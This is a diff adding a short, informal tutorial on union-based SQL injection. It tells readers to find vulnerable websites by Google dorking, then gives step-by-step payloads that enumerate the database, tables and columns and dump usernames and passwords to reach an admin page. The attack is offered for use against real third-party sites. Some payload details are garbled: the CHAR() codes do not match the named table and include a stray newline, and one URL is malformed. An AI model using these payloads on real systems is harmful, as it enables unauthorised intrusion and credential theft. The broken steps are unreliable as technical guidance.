@@ -1,0 +1,47 @@
+
+
+// SQL Injection //
+// ------------ //
+
+STEP 1:
+Find Vulnerable Site:
+
+--> Or Google it : inurl index.php?id=12 / inurl index.php?id=any-id
+--> You can also do it on localhost by creating a simple php file
+    -->eg show.php?id=122 where it will show data using id of two col username & password so there are two col.
+    -->{Here username = id} 
+
+STEP 2:
+i)Find number of col. website have
+-->Now search it this is vulnerable or not by adding ' at the last (index.php?id=12')
+  -->If it return error, then it have vulnerabilites
+-->Now find no. col it have by adding index.php?id=122 Order By 3, if there are 2 col, if 3 col then Order By 4
+   --> Do this untill you find error like this "Unknown column '3' in 'order clause'"
+
+// In my case there are 2 col & testing on ubunta db server
+
+STEP 3: 
+ii)Finding version, Database and User.
+--> using index.php?id=122 union select 1,version()   // you will get 1 5.7.38-0ubuntu0.18.04.1 - it will give you vulnerable column
+
+iii)Finding the Table name
+-->index.php?id=122 union select 1, group_concat(table_name) from information_schema.tables where table_schema=database()-- // loki_table -- name of table
+
+iv) Finding the Column name
+convert the table_name to ASSCI code & add this like
+index.php?id=122 union select 1, group_concat(column_name) FROM information_schema.columns WHERE table_name= CHAR(115, 117, 110, 97, 114, 99, 10, 95, 116, 97, 98, 108, 101)--
+
+//115, 117, 110, 97, 114, 99, 10, 95, 116, 97, 98, 108, 101 are the assci code of table name 
+// will get the table data 
+-->
+
+v) Explore Database & Hack it
+
+replace  group_concat(column_name) with group_concat(username,0x2a,password) or any other Column name you want to get Data.
+// col name you get by iv STEP
+
+index.phpid=122 union select 1, group_concat(password,0x2a,username) from your_table_name--
+
+// you will get all the data of both column using this
+
+After getting username & password of admin you can access the admin page.
